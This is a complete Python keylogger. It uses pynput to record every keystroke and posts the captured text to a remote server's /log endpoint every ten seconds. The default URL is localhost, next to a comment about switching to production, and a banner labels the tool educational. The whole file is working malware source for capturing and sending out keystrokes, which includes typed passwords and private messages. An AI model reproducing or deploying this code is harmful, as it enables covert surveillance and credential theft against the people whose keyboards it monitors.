from pynput import keyboard
import requests
import threading
from datetime import datetime

# OBS: allow IDE Input Monitoring, Accessibility, Full Disk Access in OS settings

class SimpleKeyLogger:
    def __init__(self, server_url):
        self.server_url = server_url
        self.text = ""
        self.time_interval = 10  # Send every 10 seconds

    """Send the captured text to server"""
    def send_to_server(self):
        if self.text.strip():  # Only send if there's actual text
            try:
                payload = {
                    "keyboard_data": self.text,
                    "timestamp": datetime.now().isoformat()
                }

                response = requests.post(
                    f"{self.server_url}/log",
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )

                if response.status_code == 200:
                    print(f"Sent {len(self.text)} characters to server")
                    self.text = ""  # Clear after successful send
                else:
                    print(f"Server error: {response.status_code}")

            except Exception as e:
                print(f"Could not send data: {e}")

        # Schedule next send
        timer = threading.Timer(self.time_interval, self.send_to_server)
        timer.daemon = True
        timer.start()

    """Handle key press events"""
    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                pass
            elif key == keyboard.Key.esc:
                print("\nStopping keylogger...")
                if self.text:
                    self.send_to_server() # Send any remaining text before stopping
                return False
            else:
                self.text += str(key).strip("'")

            # Show real-time preview (last 50 characters)
            preview = self.text[-50:]
            print(f"\rTyping: {preview}", end="", flush=True)

        except AttributeError:
            print(f'\n[Special key {key} pressed]')

    """Start the keylogger"""
    def start(self):
        print("SIMPLE KEYLOGGER - FOR EDUCATIONAL PURPOSES ONLY")
        print(f"\nKeylogger started. Sending to: {self.server_url}")
        print("Type anything... Press ESC to stop.")
        print("Text will be sent to server every 10 seconds.")
        print("-" * 50)

        self.send_to_server() # Start the periodic sending

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join() # Start listening to keyboard

if __name__ == "__main__":
    SERVER_URL = "http://127.0.0.1:5000"  # For local testing, change to prod later

    logger = SimpleKeyLogger(SERVER_URL)
    logger.start()